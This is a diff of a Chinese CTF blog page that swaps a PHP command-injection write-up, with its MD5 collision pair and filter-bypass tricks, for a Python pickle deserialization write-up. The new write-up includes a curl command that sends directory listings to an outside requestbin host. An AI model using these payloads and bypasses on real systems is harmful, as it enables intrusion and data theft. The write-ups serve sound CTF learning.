@@ -4,11 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="安洵杯 2019 easy_web, Z3ratu1&#39;s blog">
-    <meta name="description" content="安洵杯 2019 easy_web刷题记录
-题目第一层那个文件名两次base64加密一次十六进制转ascii，真的有点毒，我用的在线解码还出问题了。。。过了就可以拿到index.php的源码
-&amp;lt;?php
-error_reporting">
+    <meta name="keywords" content="watevrCTF-2019 Pickle Store, Z3ratu1&#39;s blog">
+    <meta name="description" content="[watevrCTF-2019] Pickle Store之前做了他们的一个cookie store的题目，cookie伪造一下就能过，是个水题，就顺着做了他们的pickle store，做起来就不太对劲了，难度upup
+同样在cookie">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -16,7 +14,7 @@ error_reporting">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>安洵杯 2019 easy_web | Z3ratu1&#39;s blog</title>
+    <title>watevrCTF-2019 Pickle Store | Z3ratu1&#39;s blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -288,13 +286,13 @@ error_reporting">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/img/ctf1.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/img/ctf.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        安洵杯 2019 easy_web
+                        watevrCTF-2019 Pickle Store
                     </div>
                 </div>
             </div>
@@ -405,8 +403,16 @@ error_reporting">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/php/" target="_blank">
-                                <span class="chip bg-color">php</span>
+                            <a href="/tags/wp/" target="_blank">
+                                <span class="chip bg-color">wp</span>
+                            </a>
+                        
+                            <a href="/tags/python/" target="_blank">
+                                <span class="chip bg-color">python</span>
+                            </a>
+                        
+                            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank">
+                                <span class="chip bg-color">反序列化</span>
                             </a>
                         
                     </div>
@@ -429,21 +435,21 @@ error_reporting">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2020-02-17
+                    2020-02-28
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>Word Count:&nbsp;&nbsp;
-                        636
+                        688
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>Read Times:&nbsp;&nbsp;
-                        3 Min
+                        2 Min
                     </div>
                     
                 
@@ -459,46 +465,14 @@ error_reporting">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="安洵杯-2019-easy-web"><a href="#安洵杯-2019-easy-web" class="headerlink" title="安洵杯 2019 easy_web"></a>安洵杯 2019 easy_web</h1><p>刷题记录</p>
-<p>题目第一层那个文件名两次base64加密一次十六进制转ascii，真的有点毒，我用的在线解码还出问题了。。。过了就可以拿到index.php的源码</p>
-<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
-<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token constant">E_ALL</span> <span class="token operator">||</span> <span class="token operator">~</span> <span class="token constant">E_NOTICE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'content-type:text/html;charset=utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
-    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-
-<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string">"/[^a-zA-Z0-9.]+/"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/flag/i"</span><span class="token punctuation">,</span> <span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword">echo</span> <span class="token string">'&lt;img src ="./ctf3.jpeg">'</span><span class="token punctuation">;</span>
-    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"xixi～ no flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
-    <span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token function">base64_encode</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token string">"&lt;img src='data:image/gif;base64,"</span> <span class="token punctuation">.</span> <span class="token variable">$txt</span> <span class="token punctuation">.</span> <span class="token string">"'>&lt;/img>"</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span>
-<span class="token keyword">echo</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\{|\}|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|{|}|\(|\)|-|&lt;|>/i"</span><span class="token punctuation">,</span> <span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"forbid ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token keyword">echo</span> <span class="token string">"&lt;br>"</span><span class="token punctuation">;</span>
-<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
-    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
-        <span class="token keyword">echo</span> `<span class="token variable">$cmd</span>`<span class="token punctuation">;</span>
-    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
-        <span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string">"md5 is funny ~"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-    <span class="token punctuation">}</span>
-<span class="token punctuation">}</span></code></pre>
-<p>说白了就是不让直接获取flag，强类型md5过了之后可以过一个超级过滤来执行命令</p>
-<h2 id="强类型md5"><a href="#强类型md5" class="headerlink" title="强类型md5"></a>强类型md5</h2><pre class=" language-php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>
-<p>限制了类型为string，且比较类型为强类型，需要硬碰撞出两个md5一样的字符串，抄一个现成的</p>
-<blockquote>
-<p>a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</p>
-</blockquote>
-<p>b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</p>
-<h2 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h2><p>Linux下的命令执行有很多绕过方法，空格使用<code>$IFS$n</code>（n为任意数字）代替，过滤关键字可以用变量拼接绕过，例如<code>a=l;${a}s;</code>即为<code>ls</code>，还可以在命令中穿插\，不会影响命令执行，如<code>c\at /fl\ag</code></p>
-<h2 id="正则匹配与转义"><a href="#正则匹配与转义" class="headerlink" title="正则匹配与转义"></a>正则匹配与转义</h2><p>PHP在进行正则匹配时需要经过两层转义才能获取到真实的字符，第一层为PHP自身的转义，第二层为正则引擎的转义，因此\\\\四个反斜杠才能匹配到一个反斜杠\，而该题中\\|\\\\这一段经过两重转义之后变成了匹配<code>|\</code>，反而不能匹配单个的反斜杠了，所以光看还是不够，有的地方还是得自己本地跑一下才知道效果</p>
+                <h1 id="watevrCTF-2019-Pickle-Store"><a href="#watevrCTF-2019-Pickle-Store" class="headerlink" title="[watevrCTF-2019] Pickle Store"></a>[watevrCTF-2019] Pickle Store</h1><p>之前做了他们的一个cookie store的题目，cookie伪造一下就能过，是个水题，就顺着做了他们的pickle store，做起来就不太对劲了，难度upup</p>
+<p>同样在cookie处能取得一串base64，解码之后用pickle.loads加载，可以看到一个数组，记载了钱数和货物，但是这回多了一个hmac的签名，加密用的密钥是没办法搞出来了，那就只能另寻他路</p>
+<h2 id="pickle反序列化漏洞"><a href="#pickle反序列化漏洞" class="headerlink" title="pickle反序列化漏洞"></a>pickle反序列化漏洞</h2><p>python的反序列化漏洞危害比PHP要大，因为能做到任意代码执行，直接写一个类，创建一个__reduce__方法，该方法在该类被序列化时使用，返回字符串或元组。<br>我们可以在返回值处调用我们想要使用的函数，不过这种方法只能调用一个函数，例如<code>return (os.system,(&#39;ls&#39;,))</code>，并且这里是一定要加逗号的，圆括号中添加逗号会将其声明为元组，而规定__reduce__方法的返回值必须是<strong>字符串或元组</strong>，使用不这么用就会报错</p>
+<p>不过不必担心没有导入os模块，我们可以在__reduce__方法中使用import进行导入，__reduce__方法作为序列化的魔法方法，返回值可以被我们控制为函数，其被反序列化时可被执行，但这样子可以执行的函数只有返回值的那一个，想要执行多个代码，我们需要手搓pickle(但是没懂为什么可以在__reduce__中import模块来导入本来没有的模块)</p>
+<h3 id="坑点1"><a href="#坑点1" class="headerlink" title="坑点1"></a>坑点1</h3><p>不同平台下的反序列化结果是不一样的，甚至python的版本也会影响pickle的结果，使用这个题在Windows下生成的payload就不奏效，最后又回到Linux上做payload</p>
+<h3 id="坑点2"><a href="#坑点2" class="headerlink" title="坑点2"></a>坑点2</h3><p>这里无论执行什么都不会有回显，但是通过执行time.sleep发现有明显的延迟，证实可以命令执行，使用url进行外带或者反弹shell，反弹shell弹了几下没成功，curl外带可以去buu的这个平台<a href="http://http.requestbin.buuoj.cn/" target="_blank" rel="noopener">http://http.requestbin.buuoj.cn/</a><br>执行的命令是 <code>curl http://http.requestbin.buuoj.cn/17ozn5q1/\?a=\</code>ls / | base64 | sed -n “1p”``<br>一开始还没看懂，其实就是像这个平台发一个请求，用GET提交一个a，内容为反引号命令执行的内容</p>
+<h3 id="手搓pickle的任意命令执行"><a href="#手搓pickle的任意命令执行" class="headerlink" title="手搓pickle的任意命令执行"></a>手搓pickle的任意命令执行</h3><p>使用一个名为marshal的库可以实现(不过如果这个库被ban了也就没戏了)<br>参考链接 <a href="https://www.freebuf.com/articles/system/89165.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/89165.html</a></p>
+<p>比如p神说的这种情况，这时需要真正的手搓pickle，理解其基本意义，实现命令执行<br><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">p神的题和解法</a></p>
 
             </div>
             <hr/>
@@ -657,9 +631,9 @@ error_reporting">
             <br/>
             <span xmlns:dct="http://purl.org/dc/terms/" href="http://purl.org/dc/dcmitype/Text"
                   property="dct:title" rel="dct:type">
-                    《安洵杯 2019 easy_web》
+                    《watevrCTF-2019 Pickle Store》
                 </span> by
-            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/02/17/%E5%AE%89%E6%B4%B5%E6%9D%AF%202019%20easy_web/" property="cc:attributionName"
+            <a xmlns:cc="http://creativecommons.org/ns#" href="/2020/02/28/%5BwatevrCTF-2019%5D%20Pickle%20Store/" property="cc:attributionName"
                rel="cc:attributionURL">
                 Z3ratu1
             </a> is licensed under a
@@ -703,78 +677,26 @@ error_reporting">
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2020/02/18/%E5%9B%BD%E8%B5%9BLove%20Math/">
+                <a href="/2020/03/01/PHP%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C%E6%BC%8F%E6%B4%9E/">
                     <div class="card-image">
                         
-                        <img src="/img/ctf.jpg" class="responsive-img" alt="国赛 Love Math">
+                        <img src="/img/php.jpg" class="responsive-img" alt="PHP文件操作漏洞">
                         
-                        <span class="card-title">国赛 Love Math</span>
+                        <span class="card-title">PHP文件操作漏洞</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            国赛 Love Math太难了，我不会
-解法先上源码
-&lt;?php
-error_reporting(0);
-//听说你很喜欢数学，不知道你是否爱它胜过爱flag
-if(!isset($_GET['c'])){
-    show_sour
+                            PHP文件操作漏洞今天师傅们在群里聊到一个问题，有关于PHP文件操作对目录和文件判定相关的一个点，看了师傅们找到的一篇文章，感觉很有意思
+PHP底层实现存在的一些问题，导致PHP写入、读取时对畸形文件名存在一些错误处理，导致漏洞产生
+例一f
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-18
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2020-03-01
                         </span>
-                        <span class="publish-author">
-                            
-                            <i class="fa fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-category" target="_blank">
-                                    刷题记录
-                                </a>
-                            
-                            
-                        </span>
-                    </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/php/" target="_blank">
-                        <span class="chip bg-color">php</span>
-                    </a>
-                    
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                Next&nbsp;<i class="fa fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/02/16/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">
-                    <div class="card-image">
-                        
-                        <img src="/img/note.jpg" class="responsive-img" alt="PHP反序列化">
-                        
-                        <span class="card-title">PHP反序列化</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            PHP中的反序列化漏洞可能利用反序列化的提示代码中出现file_get_content等文件操作相关函数unserialze，serialze等危险函数类中存在__wakeup，__toString，__call，__sleep等魔法方法这
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-16
-                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
@@ -794,8 +716,61 @@ if(!isset($_GET['c'])){
                         <span class="chip bg-color">php</span>
                     </a>
                     
-                    <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" target="_blank">
-                        <span class="chip bg-color">反序列化</span>
+                    <a href="/tags/%E6%BC%8F%E6%B4%9E/" target="_blank">
+                        <span class="chip bg-color">漏洞</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                Next&nbsp;<i class="fa fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2020/02/27/%5B%E5%98%B6%E5%90%BCCTF%5D%20Online%20Proxy/">
+                    <div class="card-image">
+                        
+                        <img src="/img/ctf1.jpg" class="responsive-img" alt="嘶吼CTF Online Proxy">
+                        
+                        <span class="card-title">嘶吼CTF Online Proxy</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            [嘶吼CTF] Online Proxy嘶吼的一个题，好像上次打了嘶吼，然后一个题磨了一天没摸出来
+一开始以为是ssrf，试了半天发现写死了必须要http:// 开头，感觉就没机会了，查看源码，发现一个注释显示显示了当前IP，修改XFF头发
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2020-02-27
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fa fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/" class="post-category" target="_blank">
+                                    刷题记录
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/wp/" target="_blank">
+                        <span class="chip bg-color">wp</span>
+                    </a>
+                    
+                    <a href="/tags/SQLI/" target="_blank">
+                        <span class="chip bg-color">SQLI</span>
                     </a>
                     
                 </div>
@@ -912,7 +887,7 @@ if(!isset($_GET['c'])){
         <div class="col s12 m8 l8 copy-right">
             
             &nbsp;<i class="fa fa-area-chart"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">25.9k</span>&nbsp;字
+                class="white-color">33.5k</span>&nbsp;字
             
             
             
